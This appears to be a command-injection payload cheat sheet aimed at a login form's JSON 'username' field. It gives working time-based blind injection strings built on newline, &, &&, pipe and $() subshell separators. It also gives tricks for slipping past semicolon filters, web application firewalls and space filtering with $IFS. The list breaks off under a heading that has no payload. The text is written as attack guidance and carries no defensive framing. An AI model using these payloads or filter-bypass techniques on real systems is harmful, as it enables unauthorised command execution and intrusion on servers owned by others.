## 1. Alternative Command Chaining Operators
If the server filters semicolons or double pipes, use these alternative command separators.

* Sequential Execution (Newline): Useful if the backend passes input to a script line-by-line.

{"password":"9012","username":"652223518\nsleep 10","rememberMe":false}

* Background Process Execution (&): Executes the command concurrently without waiting for the first part.

{"password":"9012","username":"652223518 & sleep 10 &","rememberMe":false}

* Logical AND (&&): Executes the second command only if the first string evaluates as a successful command (unlikely here, but standard).

{"password":"9012","username":"652223518 && sleep 10","rememberMe":false}

* Pipe Operator (|): Passes the output of the first string into your command.

{"password":"9012","username":"652223518 | sleep 10","rememberMe":false}


## 2. Modern Inline Subshells (\$())
If old-style backticks (`) are stripped or escaped by a Web Application Firewall (WAF), modern POSIX subshells bypass them.

* Standard Subshell:

{"password":"9012","username":"652223518$(sleep 10)","rememberMe":false}

* Nested Subshell: Forces aggressive execution layers.

{"password":"9012","username":"652223518$(co=$(sleep 10);$co)","rememberMe":false}


## 3. Space-Filtering Bypasses
Many systems filter out empty space characters ( ). Use these payloads to run commands without spaces.

* Using the Internal Field Separator ($IFS):

{"password":"9012","username":"652223518;sleep$IFS'10';","rememberMe":false}

* Using $IFS with Braces:

